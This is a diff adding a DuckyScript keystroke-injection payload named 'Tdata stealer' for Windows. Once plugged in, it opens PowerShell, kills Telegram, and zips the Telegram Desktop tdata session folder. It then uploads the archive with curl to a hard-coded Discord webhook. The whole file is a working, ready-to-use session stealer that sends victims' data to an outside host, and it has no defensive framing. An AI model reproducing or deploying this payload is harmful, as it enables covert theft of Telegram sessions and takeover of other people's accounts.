@@ -1,0 +1,36 @@
+REM #
+REM # Title:            Tdata stealer
+REM # Author:           LuKres
+REM # Version:          1.0
+REM # Category:         Stealer
+REM # Target:           Microsoft Windows
+REM #
+REM # TESTED ON
+REM # ===============
+REM # Microsoft Windows 10 Family Version 20H2 (PowerShell 5.1)
+REM # Microsoft Windows 10 Professional Version 20H2 (PowerShell 5.1)
+REM #
+REM # REQUIREMENTS
+REM # ===============
+REM # The target user must belong to the 'Administrators' group.
+REM #
+
+REM ######## INITIALIZATION ########
+
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 500
+STRING taskkill /IM telegram.exe /F
+ENTER
+DELAY 500
+STRING Get-ChildItem -Path "C:\Users\$env:username\AppData\Roaming\Telegram Desktop\tdata" | Where-Object { $_.Name -ne 'user_data' -and $_.Name -ne 'user_data#2'} | Compress-Archive -DestinationPath "C:\Users\$env:username\AppData\Roaming\Telegram Desktop\temp.zip"
+ENTER
+DELAY 10000
+STRING curl.exe https://discord.com/api/webhooks/1225696186980106281/aB1bp-rX7cgtNN7SoTpl6YHu0G0s0GYsrscuW4zRCh-hH0IWhg-ddykIXh5wiI50_LRh -F"file1=@C:\Users\$env:username\AppData\Roaming\Telegram Desktop\temp.zip"
+ENTER
+DELAY 10000
+STRING EXIT
+ENTER
+
